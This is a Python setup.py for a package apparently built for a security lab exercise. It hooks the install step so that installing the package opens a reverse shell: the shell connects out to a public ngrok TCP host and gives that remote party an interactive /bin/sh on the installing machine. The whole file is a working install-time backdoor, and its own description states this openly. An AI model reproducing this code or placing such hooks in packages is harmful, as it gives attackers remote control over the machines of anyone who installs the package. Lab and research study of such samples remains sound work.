import setuptools
from setuptools.command.install import install
import os
import socket
import subprocess

# Function to trigger the reverse shell
def reverse_shell():
    host = "3.tcp.ngrok.io"  # Your Ngrok public TCP host
    port = 25936             # Your Ngrok public TCP port

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        print(f"Reverse shell connection failed: {e}")

# Custom command to execute post-installation
class PostInstallCommand(install):
    def run(self):
        install.run(self)  # Run the standard install process
        print("Executing reverse shell...")
        reverse_shell()    # Execute the reverse shell after installation

# Package setup
setuptools.setup(
    name="artifact-lab-3-package-db7d716a",
    version="1.1.0",  # Incremented version to ensure proper installation
    description="Package with reverse shell triggered on installation",
    author="Your Name",
    author_email="your_email@example.com",
    cmdclass={
        'install': PostInstallCommand,  # Ensure custom post-installation command runs
    },
    python_requires=">=3.6",
)
